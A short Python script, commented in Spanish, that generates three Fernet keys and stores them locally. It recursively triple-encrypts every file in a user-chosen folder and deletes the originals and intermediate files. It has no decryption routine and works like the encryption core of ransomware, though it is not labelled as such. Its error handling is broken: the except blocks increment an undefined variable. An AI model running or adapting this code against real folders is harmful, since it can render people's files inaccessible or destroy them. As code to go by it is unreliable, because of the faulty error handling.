import os
from cryptography.fernet import Fernet


def generar_claves():
    claves = [Fernet.generate_key() for _ in range(3)]
    for i, clave in enumerate(claves, start=1):
        with open(f'password/clave{i}.key', 'wb') as clave_archivo:
            clave_archivo.write(clave)
    return claves


def cargar_clave():
    claves = []
    for i in range(1, 4):
        with open(f'password/clave{i}.key', 'rb') as clave_archivo:
            claves.append(clave_archivo.read())
    return claves

    
def encriptar_archivo(archivo, claves):
    if os.path.basename(archivo) == "desktop.ini":
        return
    cifrador_1 = Fernet(claves[0])
    try:
        with open(archivo, 'rb') as archivo_entrada:
            datos = archivo_entrada.read()
        datos_cifrados_1 = cifrador_1.encrypt(datos)
        with open(f'{archivo}.enc1', 'wb') as archivo_salida_1:
            archivo_salida_1.write(datos_cifrados_1)
    except Exception as e:
        errors = errors + 1

    cifrador_2 = Fernet(claves[1])
    try:
        with open(f'{archivo}.enc1', 'rb') as archivo_entrada_2:
            datos_2 = archivo_entrada_2.read()
        datos_cifrados_2 = cifrador_2.encrypt(datos_2)
        with open(f'{archivo}.enc2', 'wb') as archivo_salida_2:
            archivo_salida_2.write(datos_cifrados_2)
        os.remove(f'{archivo}.enc1')  
    except Exception as e:
        errors = errors + 1

    cifrador_3 = Fernet(claves[2])
    try:
        with open(f'{archivo}.enc2', 'rb') as archivo_entrada_3:
            datos_3 = archivo_entrada_3.read()
        datos_cifrados_3 = cifrador_3.encrypt(datos_3)
        with open(f'{archivo}.enc', 'wb') as archivo_salida_3:
            archivo_salida_3.write(datos_cifrados_3)
        os.remove(f'{archivo}.enc2')
        os.remove(archivo)
    except Exception as e:
        errors = errors +1


def encriptar_carpeta(ruta_carpeta, clave):
    for nombre_archivo in os.listdir(ruta_carpeta):
        ruta_archivo = os.path.join(ruta_carpeta, nombre_archivo)
        if os.path.isfile(ruta_archivo):
            encriptar_archivo(ruta_archivo, clave)
        elif os.path.isdir(ruta_archivo):
            encriptar_carpeta(ruta_archivo, clave)


if __name__ == "__main__":
    generar_claves()
    clave = cargar_clave()
    carpeta_a_encriptar = '' #pon tu carpeta
    encriptar_carpeta(carpeta_a_encriptar, clave)
